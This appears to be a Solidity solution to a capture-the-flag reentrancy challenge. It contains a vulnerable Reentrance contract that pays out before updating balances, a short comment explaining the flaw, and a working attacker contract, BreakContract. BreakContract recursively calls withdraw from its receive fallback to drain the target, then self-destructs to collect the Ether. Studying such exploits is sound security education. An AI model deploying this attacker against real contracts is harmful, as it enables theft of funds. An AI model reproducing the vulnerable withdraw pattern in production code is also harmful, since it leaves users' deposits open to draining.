// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/solc-0.6/contracts/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;
    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result, ) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

/* 
msg.sender.call.value(_amount)() If the msg.sender is a contract, it will call the fallback function.
The balance deduction is made after the call.
Therefore, if this code is called in the fallback function of the sender, it will cause a recursion, sending the value multiple times before reducing the sender's balance. */

contract BreakContract {
    Reentrance public reentrance;

    constructor(Reentrance _reentrance) public {
        reentrance = _reentrance;
    }

    function collect() external payable {
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(msg.value);
    }

    function withdraw() external {
        selfdestruct(msg.sender);
    }

    receive() external payable {
        if (address(reentrance).balance >= msg.value) {
            reentrance.withdraw(msg.value);
        }
    }
}
